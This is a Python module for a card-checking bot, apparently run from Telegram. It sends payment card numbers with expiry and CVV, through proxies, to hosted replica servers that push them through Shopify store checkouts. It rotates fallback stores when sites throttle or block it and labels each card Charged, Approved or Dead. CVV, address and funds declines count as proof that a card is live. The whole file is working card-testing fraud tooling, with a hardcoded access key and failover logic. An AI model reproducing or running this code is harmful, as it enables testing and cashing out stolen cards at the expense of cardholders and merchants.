"""
Shopify API Manager — Stateless Edition (v4.4.0)
"""

import asyncio
import aiohttp
import logging
import random
import re
import time
import urllib.parse
from typing import Optional, Dict, Any, List

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HOSTED API SERVERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

API_SERVERS = [
    "https://shopi-production-8424.up.railway.app",
    "https://shopi-production-8a5f.up.railway.app",
    "https://web-production-28654.up.railway.app",
    "https://shopi-production-4802.up.railway.app",
]

SHOPIFY_API_KEY = "oozaruhshop"
ALT_API_KEY     = "oozaruhshop"

ACTIVE_API_SERVERS: List[str] = API_SERVERS.copy()
SERVER_HEALTH: Dict[str, dict] = {}

# Cap forwarded fallback list to keep URLs safe.
FALLBACK_SITES_CAP = 20

# S9: known "pool exhausted" phrasings the API may return. Keep this list
# short and specific — anything here causes another replica to be tried.
POOL_EXHAUSTED_MESSAGE_PATTERNS = (
    "sites exhausted",
    "all sites exhausted",
    "site pool exhausted",
    "no viable site",
    "no sites available",
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SERVER SELECTOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_active_server() -> str:
    pool = ACTIVE_API_SERVERS if ACTIVE_API_SERVERS else API_SERVERS
    return random.choice(pool)

def get_active_servers_excluding(seen: set) -> List[str]:
    remaining = [s for s in ACTIVE_API_SERVERS if s not in seen]
    if not remaining:
        remaining = [s for s in API_SERVERS if s not in seen]
    return remaining or list(API_SERVERS)


def format_proxy(proxy: Optional[str]) -> Optional[str]:
    """
    Accept three input shapes and return the API's expected
    `host:port:user:pass` (or `host:port` when no auth):

      1. Full URL:                     http://user:pass@host:port
      2. Stripped userinfo (msh.py):   user:pass@host:port
      3. Bare no-auth:                 host:port
    """
    if not proxy:
        return None
    p = proxy.strip()

    # Shape 1 — full URL with protocol
    if p.startswith(("http://", "https://")):
        parsed = urllib.parse.urlparse(p)
        # Never fabricate "host:None" when the port is missing.
        if parsed.hostname and parsed.port:
            if parsed.username and parsed.password:
                return f"{parsed.hostname}:{parsed.port}:{parsed.username}:{parsed.password}"
            return f"{parsed.hostname}:{parsed.port}"
        return p

    # Shape 2 — "user:pass@host:port" (no protocol; what msh.py passes)
    if "@" in p and ":" in p.split("@", 1)[0]:
        userinfo, hostport = p.split("@", 1)
        if ":" in hostport and hostport.rsplit(":", 1)[1].isdigit():
            user, _, pw = userinfo.partition(":")
            return f"{hostport}:{user}:{pw}"

    # Shape 3 — bare "host:port" (no-auth)
    if "@" not in p and p.count(":") == 1 and p.rsplit(":", 1)[1].isdigit():
        return p

    # Unknown shape — pass through untouched so the API can surface its error
    return p

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GATE RESPONSE CLASSIFIER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _matches_keyword(k: str, msg_upper: str) -> bool:
    """Numeric keywords must match on word boundaries to avoid false
    positives like 'ERROR_1400' or 'HTTP 103 EARLY HINTS'."""
    if k.isdigit():
        return bool(re.search(rf'\b{re.escape(k)}\b', msg_upper))
    return k in msg_upper


def classify_gate_response(response_msg: str, raw_dict: Optional[dict] = None, gateway: str = "") -> dict:
    if raw_dict is None:
        raw_dict = {}

    charged_flag = (str(raw_dict.get('Charged', '')).lower() == 'true'
                    or str(raw_dict.get('charged', '')).lower() == 'true')
    approved_flag = (str(raw_dict.get('Approved', '')).lower() == 'true'
                     or str(raw_dict.get('approved', '')).lower() == 'true')

    if charged_flag:
        return {'status': 'Charged', 'retry': False}
    if approved_flag:
        return {'status': 'Approved', 'retry': False}

    msg = str(response_msg or "").strip()
    msg_upper = msg.upper()

    CHARGED_KEYWORDS = [
        'ORDER_PLACED', 'PAYMENT_COMPLETE', 'SUBMITSUCCESS', 'ORDER_CREATED',
        'PROCESSEDRECEIPT', 'PAYMENT SUCCESSFUL', 'SUCCEEDED', 'AUTHORISED',
        'PAYMENT ACCEPTED', 'THANK YOU FOR YOUR ORDER', 'THANK YOU', 'CHARGED',
        'SALE', 'RECEIPT', 'RECEIPT_ID', 'CONFIRMATION_NUMBER', 'ORDER_CONFIRMED',
        'TRANSACTION_COMPLETED', 'ORDER_STATUS_URL', 'ORDER_SUCCESS'
    ]
    if any(k in msg_upper for k in CHARGED_KEYWORDS):
        return {'status': 'Charged', 'retry': False}

    INSUFFICIENT_FUNDS_KEYWORDS = [
        'INSUFFICIENT_FUNDS', 'INSUFFICIENT FUNDS', 'NOT_ENOUGH_BALANCE',
        'NOT ENOUGH BALANCE', 'LOW_BALANCE', '140'
    ]
    CVV_MISMATCH_KEYWORDS = [
        'INVALID_CVC', 'INCORRECT_CVC', 'CVC_DECLINED', 'CVV MISMATCH', 'CVV_MISMATCH',
        'SECURITY CODE', 'SECURITY_CODE', 'CVC CHECK FAILED', 'CVC_CHECK', 'INVALID_CVV',
        '103', '144'
    ]
    THREEDS_KEYWORDS = [
        '3DS_REQUIRED', '3D_SECURE', '3DS', 'AUTHENTICATION_REQUIRED',
        'ACTION_REQUIRED', 'REDIRECTSHOPPER', 'CHALLENGESHOPPER',
        'IDENTIFYSHOPPER', 'PRESENTTOSHOPPER', '128'
    ]
    AVS_MISMATCH_KEYWORDS = [
        'INCORRECT_ZIP', 'ZIP_MISMATCH', 'AVS_FAILED', 'BILLING_ADDRESS_MISMATCH',
        'ADDRESS VERIFICATION FAILED', 'POSTAL_CODE_MISMATCH'
    ]
    APPROVED_KEYWORDS = [
        'APPROVED', 'APPROVE_WITH_ID', 'SUCCESS', 'ZERO AUTH', 'LIVE', 'CCN LIVE',
        'CARD_TESTING'
    ]

    if any(_matches_keyword(k, msg_upper) for k in INSUFFICIENT_FUNDS_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(_matches_keyword(k, msg_upper) for k in CVV_MISMATCH_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(_matches_keyword(k, msg_upper) for k in THREEDS_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(_matches_keyword(k, msg_upper) for k in AVS_MISMATCH_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if (any(k in msg_upper for k in APPROVED_KEYWORDS)
            and not any(k in msg_upper for k in
                        ['NOT APPROVED', 'UNAPPROVED', 'DECLINED'])):
        return {'status': 'Approved', 'retry': False}

    SITE_ERROR_KEYWORDS = [
        'NO_PRODUCT', 'THROTTLED', 'TIMEOUT', 'TOKENIZATION_FAILED',
        'SITE_REQUIRES_LOGIN', 'CART_FAILED', 'CHECKOUT_FAILED',
        'NEGOTIATE_FAILED', 'GRAPHQL_ERROR', 'SESSION_EXPIRED',
        'NO_SESSION_TOKEN', 'NO_ATTEMPT_TOKEN', 'NO_SELLER_PROPOSAL',
        'CHECKPOINTDENIED', 'NO_SHOPIFY_PAYMENTS_GATEWAY', 'SUBMIT_FAILED',
        'ORDER_CREATION_FAILED', 'NO_PAYMENT_REQUIRED', 'PROXY ERROR',
        'CONNECTION REFUSED', 'HOST UNREACHABLE', 'INTERNAL_SERVER_ERROR',
        'GATEWAY_TIMEOUT', 'BAD_GATEWAY', 'CLOUDFLARE_BLOCKED',
        'MERCHANT_ACCOUNT_CLOSED', 'GATEWAY_NOT_CONFIGURED',
        'SITE DEAD', 'INVALID SITE', 'CAPTCHA_REQUIRED', 'NOT_SUPPORTED',
        'FAILED TO GET TOKEN', 'SITE ERROR', 'NO_SITES'
    ]
    if any(k in msg_upper for k in SITE_ERROR_KEYWORDS):
        return {'status': 'Site Error', 'retry': True}

    return {'status': 'Dead', 'retry': False}


def _is_pool_exhausted(data: dict) -> bool:
    """
    S9: match a small set of phrasings so an API wording change doesn't
    silently disable the cross-replica retry.

    Still gated on Response == SITE_ERROR (or empty) so an unrelated error
    that happens to mention "sites" cannot trigger a replica hop.
    """
    code = str(data.get("Response", "")).upper()
    msg = str(data.get("Message", "") or data.get("message", "")).lower()
    if code not in ("SITE_ERROR", ""):
        return False
    return any(p in msg for p in POOL_EXHAUSTED_MESSAGE_PATTERNS)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CLIENT ENDPOINTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _build_fallback_string(site: str, fallback_sites: Optional[List[str]]) -> Optional[str]:
    """Seed `seen` with `site` so the primary site never appears in the
    fallback list (the API would try it twice, wasting one attempt)."""
    if not fallback_sites:
        return None
    seen = {site}
    cleaned: List[str] = []
    for s in fallback_sites:
        if not s:
            continue
        ss = s.strip()
        if not ss:
            continue
        if not ss.startswith("http"):
            ss = f"https://{ss}"
        if ss in seen:
            continue
        seen.add(ss)
        cleaned.append(ss)
        if len(cleaned) >= FALLBACK_SITES_CAP:
            break
    return ",".join(cleaned) if cleaned else None


async def check_shopify_card(
    site: str,
    cc: str,
    proxy: Optional[str] = None,
    session: Optional[aiohttp.ClientSession] = None,
    max_retries: int = 3,
    timeout_sec: float = 40.0,
    fallback_sites: Optional[List[str]] = None,
    attempts: int = 3,
    auto: bool = False,
) -> dict:
    """
    Run a single card through one or more Shopify API replicas.

    Parameters
    ----------
    site : str
        Primary site URL or hostname. Protocol is added if missing.
    cc : str
        Card string formatted as `number|month|year|cvv`.
    proxy : Optional[str]
        Any of the three shapes accepted by `format_proxy()` — full URL,
        stripped `user:pass@host:port` (what msh.py sends), or bare
        `host:port`. Passed to the API as `host:port:user:pass`.
    session : Optional[aiohttp.ClientSession]
        S10 (TLS / SSL ownership):
            If provided, this function **does not modify** the session's
            SSL settings. The caller owns TLS configuration. In production
            the API replicas serve valid Let's Encrypt certificates, so a
            default `ssl=True` session works — but if you ever point this
            at a self-signed replica you MUST pass a session whose
            connector has `ssl=False`, or a `ClientConnectorSSLError`
            will surface as `API_REPLICAS_UNREACHABLE`.
            msh.py always passes a session created with `ssl=False`, so
            the fast path is unaffected.
            If `None`, a temporary session is created and closed
            automatically; TLS defaults to aiohttp's standard verification.
    max_retries : int
        Maximum number of *distinct replicas* to try. Each retry also
        consumes one cross-replica sleep with jitter (S6).
    timeout_sec : float
        Per-request timeout handed to aiohttp.
    fallback_sites : Optional[List[str]]
        Extra sites the API is allowed to rotate into on "no product"
        responses. Capped to `FALLBACK_SITES_CAP` and deduped against
        `site` (S1).
    attempts : int
        S8: how many times the API tries each site. Default lowered from
        15 to 3 — 15 wastefully hammered a single site. Values below 1
        are clamped to 1 so callers cannot accidentally disable the
        per-site retry loop. msh.py passes `attempts=1` explicitly.
    auto : bool
        When True, tells the API to auto-rotate through `fallback_sites`.

    Returns
    -------
    dict
        Always contains at least `Response`, `Message`, `Status`, and
        `Classification`. On complete replica failure the dict has
        `Response="API_REPLICAS_UNREACHABLE"` and
        `Classification={"status": "Site Error", "retry": True}`.
    """
    if not site.startswith("http"):
        site = f"https://{site}"

    # S8: clamp attempts defensively — caller passing 0 or a negative
    # number should not suppress the per-site retry loop entirely.
    try:
        attempts = max(1, int(attempts))
    except (TypeError, ValueError):
        attempts = 3

    proxy_str = format_proxy(proxy)
    close_session = False
    if session is None:
        client_timeout = aiohttp.ClientTimeout(total=timeout_sec)
        session = aiohttp.ClientSession(timeout=client_timeout)
        close_session = True

    fallback_str: Optional[str] = _build_fallback_string(site, fallback_sites)

    try:
        tested_servers: set = set()
        last_error: Optional[str] = None

        for attempt in range(max_retries):
            candidates = get_active_servers_excluding(tested_servers)
            if not candidates:
                candidates = list(API_SERVERS)
            server = random.choice(candidates)
            tested_servers.add(server)

            params = {
                "site":     site,
                "cc":       cc,
                "key":      SHOPIFY_API_KEY,
                "attempts": str(attempts),
            }
            if proxy_str:
                params["proxy"] = proxy_str
            if auto:
                params["auto"] = "true"
            if fallback_str:
                params["fallback_sites"] = fallback_str

            url = f"{server}/shopify?{urllib.parse.urlencode(params)}"

            try:
                async with session.get(url, timeout=timeout_sec) as resp:
                    # ── 200 OK ──
                    if resp.status == 200:
                        data = await resp.json()

                        if _is_pool_exhausted(data):
                            last_error = str(data.get("Message", "sites exhausted"))
                            logging.info(
                                "[shopify_api] replica %s exhausted client sites (%s) — "
                                "trying a different replica (attempt %d/%d)",
                                server, last_error, attempt + 1, max_retries,
                            )
                            if attempt < max_retries - 1:
                                # S6: jitter to spread retries across replicas.
                                await asyncio.sleep(0.15 + random.uniform(0, 0.35))
                                continue
                            resp_msg = str(data.get("Response", "SITE_ERROR"))
                            gateway = data.get("Gate",
                                               data.get("Gateway", "Shopify Payments"))
                            data["Classification"] = classify_gate_response(
                                resp_msg, data, gateway
                            )
                            data["Status"] = False
                            return data

                        resp_msg = data.get("Response",
                                            data.get("card_response", "Unknown"))
                        gateway = data.get("Gate",
                                           data.get("Gateway", "Shopify Payments"))
                        data["Classification"] = classify_gate_response(
                            resp_msg, data, gateway
                        )
                        data["Status"] = data["Classification"]["status"] in (
                            "Charged", "Approved"
                        )
                        return data

                    # ── 401/403: try ALT key once ──
                    elif resp.status in (401, 403):
                        alt_params = dict(params)
                        alt_params["key"] = ALT_API_KEY
                        alt_url = f"{server}/shopify?{urllib.parse.urlencode(alt_params)}"
                        try:
                            async with session.get(alt_url, timeout=timeout_sec) as alt_resp:
                                if alt_resp.status == 200:
                                    data = await alt_resp.json()
                                    if _is_pool_exhausted(data):
                                        last_error = str(data.get("Message",
                                                                  "sites exhausted"))
                                        if attempt < max_retries - 1:
                                            await asyncio.sleep(
                                                0.15 + random.uniform(0, 0.35)
                                            )
                                            continue
                                    resp_msg = data.get("Response",
                                                        data.get("card_response",
                                                                 "Unknown"))
                                    gateway = data.get("Gate",
                                                       data.get("Gateway",
                                                                "Shopify Payments"))
                                    data["Classification"] = classify_gate_response(
                                        resp_msg, data, gateway
                                    )
                                    data["Status"] = data["Classification"]["status"] in (
                                        "Charged", "Approved"
                                    )
                                    return data
                                else:
                                    # S3: record the alt-key failure so the
                                    # final message isn't misleading.
                                    last_error = (
                                        f"HTTP {alt_resp.status} "
                                        f"(both keys rejected) from {server}"
                                    )
                                    logging.warning(
                                        "[shopify_api] %s rejected both primary "
                                        "and alt keys with HTTP %s",
                                        server, alt_resp.status,
                                    )
                        except Exception as e:
                            last_error = f"alt-key: {e}"
                            logging.warning(
                                "[shopify_api] alt-key fetch failed on %s: %s",
                                server, e,
                            )

                    # ── 400: client error, retrying won't help ──
                    elif resp.status == 400:
                        # S7: guarantee Response/Message exist even if the
                        # body is empty, non-JSON, or an unexpected shape.
                        try:
                            data = await resp.json()
                        except Exception:
                            data = {}
                        if not isinstance(data, dict):
                            data = {}
                        data.setdefault("Response", "BAD_REQUEST")
                        data.setdefault("Message", f"HTTP 400 from {server}")
                        code = str(data.get("Response", "")).upper()
                        if code == "NO_SITES":
                            logging.warning(
                                "[shopify_api] %s returned NO_SITES — "
                                "bot must pass fallback_sites when auto=True",
                                server,
                            )
                        else:
                            logging.warning(
                                "[shopify_api] %s returned 400 (%s) — "
                                "client error, not retrying",
                                server, data.get("Message", ""),
                            )
                        data["Classification"] = {"status": "Site Error",
                                                   "retry": False}
                        data["Status"] = False
                        return data

                    # ── other status ──
                    else:
                        last_error = f"HTTP {resp.status}"
                        logging.warning(
                            "[shopify_api] %s returned HTTP %s (attempt %d/%d)",
                            server, resp.status, attempt + 1, max_retries,
                        )

            except Exception as e:
                last_error = f"{type(e).__name__}: {e}"
                logging.warning(
                    "[shopify_api] attempt %d/%d on %s failed: %s",
                    attempt + 1, max_retries, server, e,
                )
                await asyncio.sleep(0.3)

        return {
            "Response":       "API_REPLICAS_UNREACHABLE",
            "Message":        last_error or "All replicas failed",
            "CC":             cc,
            "Price":          "0.00",
            "Gate":           "Shopify Payments",
            "Site":           site,
            "Charged":        "False",
            "Approved":       "False",
            "Time":           "0s",
            "Status":         False,
            "Classification": {"status": "Site Error", "retry": True},
        }
    finally:
        if close_session:
            await session.close()


async def check_site(
    site: str,
    card: Optional[str] = None,
    proxy: Optional[str] = None,
    session: Optional[aiohttp.ClientSession] = None,
    timeout_sec: float = 20.0,
) -> dict:
    if not site.startswith("http"):
        site = f"https://{site}"

    proxy_str = format_proxy(proxy)
    close_session = False
    if session is None:
        client_timeout = aiohttp.ClientTimeout(total=timeout_sec)
        session = aiohttp.ClientSession(timeout=client_timeout)
        close_session = True

    try:
        server = get_active_server()
        params = {"site": site, "key": SHOPIFY_API_KEY}
        if card:
            params["card"] = card
        if proxy_str:
            params["proxy"] = proxy_str

        url = f"{server}/check?{urllib.parse.urlencode(params)}"
        try:
            async with session.get(url, timeout=timeout_sec) as resp:
                if resp.status == 200:
                    return await resp.json()
        except Exception:
            pass

        for alt_server in API_SERVERS:
            if alt_server == server:
                continue
            alt_params = {"site": site, "key": SHOPIFY_API_KEY}
            if card:
                alt_params["card"] = card
            if proxy_str:
                alt_params["proxy"] = proxy_str
            try:
                async with session.get(
                    f"{alt_server}/check?{urllib.parse.urlencode(alt_params)}",
                    timeout=timeout_sec,
                ) as resp:
                    if resp.status == 200:
                        return await resp.json()
            except Exception:
                continue

        return {
            "valid":  False,
            "site":   site,
            "reason": "CHECK_FAILED",
            "detail": "All replicas unreachable",
        }
    finally:
        if close_session:
            await session.close()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DEPRECATED — kept as no-op so main.py doesn't break
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def push_sites_to_all_replicas(sites: List[str]) -> Dict[str, Any]:
    logging.warning(
        "[shopify_api] push_sites_to_all_replicas() is deprecated — "
        "the API is stateless and receives sites per-request. "
        "Remove the call from main.py."
    )
    return {
        "deprecated": True,
        "pushed":     0,
        "results":    {},
        "note":       "API is stateless — pass fallback_sites on every "
                      "check_shopify_card call",
    }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND HEALTH CHECK
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def auto_health_check():
    logging.info("[shopify_api] auto_health_check started for %d API servers.",
                 len(API_SERVERS))
    while True:
        try:
            active: List[str] = []
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                for api in API_SERVERS:
                    t0 = time.time()
                    try:
                        async with session.get(f"{api}/health") as resp:
                            elapsed = round(time.time() - t0, 3)
                            if resp.status != 200:
                                SERVER_HEALTH[api] = {
                                    "status":     f"HTTP {resp.status}",
                                    "latency":    f"{elapsed}s",
                                    "last_check": time.time(),
                                }
                                continue

                            data = await resp.json()
                            if str(data.get("status", "")).lower() != "ok":
                                SERVER_HEALTH[api] = {
                                    "status":     data.get("status", "unknown"),
                                    "latency":    f"{elapsed}s",
                                    "last_check": time.time(),
                                }
                                continue

                            active.append(api)
                            SERVER_HEALTH[api] = {
                                "status":            "online",
                                "version":           data.get("version", "?"),
                                "mode":              data.get("mode", "?"),
                                "latency":           f"{elapsed}s",
                                "keys_configured":   data.get("keys_configured", 0),
                                "site_concurrency":  data.get("site_concurrency", 0),
                                "blacklisted_sites": data.get("blacklisted_sites", 0),
                                "throttled_sites":   data.get("throttled_sites", 0),
                                "last_check":        time.time(),
                            }
                    except Exception as e:
                        SERVER_HEALTH[api] = {
                            "status":     f"offline ({type(e).__name__})",
                            "latency":    "-",
                            "last_check": time.time(),
                        }

            # S4: prune stale entries for servers that were removed from
            # API_SERVERS so SERVER_HEALTH doesn't grow unboundedly.
            for stale in list(SERVER_HEALTH.keys()):
                if stale not in API_SERVERS:
                    del SERVER_HEALTH[stale]

            if active:
                ACTIVE_API_SERVERS.clear()
                ACTIVE_API_SERVERS.extend(active)
                logging.debug(
                    "[shopify_api] health: %d/%d replicas active",
                    len(active), len(API_SERVERS),
                )
            else:
                logging.warning(
                    "[shopify_api] no healthy replicas — keeping previous "
                    "active list (%d)",
                    len(ACTIVE_API_SERVERS),
                )
        except Exception as e:
            logging.error("[shopify_api] health check loop exception: %s", e)

        await asyncio.sleep(60)

def get_health_summary() -> str:
    lines = [
        "<b>⚡ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗔𝗣𝗜 𝗖𝗹𝘂𝘀𝘁𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀</b>",
        "━━━━━━━━━━━━━━━━━━━━━",
    ]
    for idx, s in enumerate(API_SERVERS, 1):
        info = SERVER_HEALTH.get(s, {})
        status     = info.get("status", "unknown")
        latency    = info.get("latency", "-")
        version    = info.get("version", "?")
        mode       = info.get("mode", "?")
        blacklisted = info.get("blacklisted_sites", 0)
        throttled  = info.get("throttled_sites", 0)

        domain = urllib.parse.urlparse(s).netloc.split(".")[0]
        icon = "🟢" if status == "online" else "🔴"

        lines.append(f"{icon} <b>Replica {idx}</b> (<code>{domain}</code>)")
        lines.append(f"  ├ Status: <code>{status}</code>")
        lines.append(f"  ├ Version: <code>{version}</code> ({mode})")
        lines.append(f"  ├ Blacklisted: <code>{blacklisted}</code> · "
                     f"Throttled: <code>{throttled}</code>")
        lines.append(f"  └ Latency: <code>{latency}</code>")

    lines.append("━━━━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 <b>Active Replicas:</b> "
                 f"{len(ACTIVE_API_SERVERS)}/{len(API_SERVERS)}")
    return "\n".join(lines)
